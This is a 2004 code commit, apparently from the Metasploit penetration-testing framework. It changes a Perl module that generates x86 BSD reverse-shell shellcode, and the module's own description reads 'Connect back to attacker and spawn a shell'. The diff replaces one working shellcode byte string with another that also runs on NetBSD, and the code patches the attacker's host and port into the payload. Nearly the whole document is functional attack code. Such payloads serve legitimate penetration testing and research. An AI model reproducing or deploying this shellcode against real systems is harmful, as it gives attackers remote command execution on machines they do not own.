fa1c8a335daba0f521e756865c5ba9c58275d6b3
Matt Miller <mmiller@hick.org>
2004-12-19 03:21:09 +0000

    bsd_ia32_reverse works on netbsd now, but is 3 bytes larger :~(

--- payloads/bsd_ia32_reverse.pm
+++ payloads/bsd_ia32_reverse.pm
@@ -16,56 +16,60 @@ my $info =
   'Name'         => 'BSD IA32 Reverse Shell',
   'Version'      => '$Revision$',
   'Description'  => 'Connect back to attacker and spawn a shell',
-  'Authors'      => [ 'root[at]marcetam.net [Unknown License]', ],
+  'Authors'      => [ 'skape <mmiller [at] hick.org>', ],
   'Arch'         => [ 'x86' ],
   'Priv'         => 0,
   'OS'           => [ 'bsd' ],
   'Size'         => '',
 };
 
-sub new {
-  my $class = shift;
-  my $hash = @_ ? shift : { };
-  $hash = $class->MergeHashRec($hash, {'Info' => $info});
-  my $self = $class->SUPER::new($hash, @_);
+sub new 
+{
+	my $class = shift;
+	my $hash = @_ ? shift : { };
+	$hash = $class->MergeHashRec($hash, {'Info' => $info});
+	my $self = $class->SUPER::new($hash, @_);
 
-  $self->_Info->{'Size'} = $self->_GenSize;
-  return($self);
+	$self->_Info->{'Size'} = $self->_GenSize;
+	return($self);
 }
 
-sub Build {
-  my $self = shift;
-  return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
+sub Build 
+{
+	my $self = shift;
+
+	return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
 }
 
-sub Generate {
-  my $self = shift;
-  my $host = shift;
-  my $port = shift;
-  my $off_host = 10;
-  my $off_port = 18;
-  
-  my $shellcode = # bsd reverse connect by root[at]marcetam.net
-  "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68\xaa\xbb\xcc\xdd\xcd\x80".
-  "\x66\x68\xbb\xaa\x66\x52\x89\xe6\x6a\x10\x56\x50\x50\x6a\x62\x58".
-  "\xcd\x80\x5b\xb0\x5a\x52\x53\x52\x4a\xcd\x80\x7d\xf6\x68\x6e\x2f".
-  "\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd".
-  "\x80";
+sub Generate 
+{
+	my $self = shift;
+	my $host = shift;
+	my $port = shift;
+	my $off_host = 0xa;
+	my $off_port = 0x13;
+	  
+	my $shellcode =
+		"\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68\x7f\x00\x00\x01\xcd\x80" .
+		"\x68\x10\x02\xbf\xbf\x89\xe1\x6a\x10\x51\x50\x51\x97\x6a\x62\x58" .
+		"\xcd\x80\x6a\x02\x59\xb0\x5a\x51\x57\x51\xcd\x80\x49\x79\xf6\x50" .
+		"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x53" .
+		"\xb0\x3b\xcd\x80";
 
-  my $host_bin = gethostbyname($host);
-  my $port_bin = pack('n', $port);
+	my $host_bin = gethostbyname($host);
+	my $port_bin = pack('n', $port);
 
-  substr($shellcode, $off_host, 4, $host_bin);
-  substr($shellcode, $off_port, 2, $port_bin);
-  
-  # $shellcode = "\x81\xc4\x00\xfe\xff\xff" . $shellcode;
-  return($shellcode);
+	substr($shellcode, $off_host, 4, $host_bin);
+	substr($shellcode, $off_port, 2, $port_bin);
+	  
+	return($shellcode);
 }
 
 sub _GenSize {
-  my $self = shift;
-  my $bin = $self->Generate('127.0.0.1', 4444);
-  return(length($bin));
+	my $self = shift;
+	my $bin = $self->Generate('127.0.0.1', 4444);
+
+	return(length($bin));
 }
 
 1;
